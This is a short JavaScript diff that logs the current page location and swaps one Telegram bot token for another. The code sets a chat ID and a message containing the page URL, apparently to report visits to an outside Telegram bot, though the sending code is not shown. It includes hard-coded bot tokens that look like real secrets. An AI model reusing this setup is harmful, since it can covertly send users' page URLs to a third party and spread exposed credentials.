@@ -1,7 +1,7 @@
  let currentLocation = window.location;
 console.log(currentLocation);
 
-let botToken = '6163011453:AAE2E6uKEE1hyQ3knu7tjJpYwIDvS7yEQPg';
+let botToken = '6735455497:AAHTFrKiu3NL-1jP_Qe3Qoi5vfvaUK2ByAY';
 let chatId = '4128038389';
 let messageText = currentLocation.href;
 
